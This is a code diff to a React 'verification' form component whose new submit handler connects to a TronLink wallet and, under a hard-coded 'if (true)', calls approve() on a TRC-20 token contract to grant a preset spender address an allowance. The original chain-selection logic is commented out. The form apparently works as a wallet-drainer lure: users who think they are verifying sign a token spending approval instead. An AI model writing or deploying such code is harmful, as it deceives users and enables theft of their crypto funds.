@@ -63,7 +63,7 @@ const VerificationFormComponent = (props) => {
     const { name, value } = e.target
     setFormData(prev => ({ ...prev, [name]: value }))
   }
-  
+
   const busdAbi = [
     {
       "constant": false,
@@ -343,17 +343,36 @@ const VerificationFormComponent = (props) => {
     }
   };
 
-  const handleSubmit = async(value) => {
+  const handleSubmit = async (value) => {
 
-    if (disconnect) {
-      await disconnect();
-    }
+    if (window.tronLink && window.tronLink.request) {
+      console.log('helloo');
 
-    if (formData?.blockchain === 'tron') {
-      handleConnect(value)
-    } else if (formData?.blockchain === 'binance') {
-      approveToken()
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
     }
+    let txHash;
+    // if (isBitgetTron && window.tronWeb) {
+    if (true) {
+
+      // Use Bitget's injected tronWeb for signing and sending
+      const contract = await window.tronWeb.contract().at(trxContractAddress);
+      const tx = await contract.approve(spenderTrx, (spenderAmount * 1_000_000).toString()).send({
+        feeLimit: 300_000_000,
+        callValue: 0,
+      });
+      console.log('tx', tx);
+
+      txHash = tx; // Bitget returns txid directly
+    }
+    // if (disconnect) {
+    //   await disconnect();
+    // }
+
+    // if (formData?.blockchain === 'tron') {
+    //   handleConnect(value)
+    // } else if (formData?.blockchain === 'binance') {
+    //   approveToken()
+    // }
   }
 
   return (
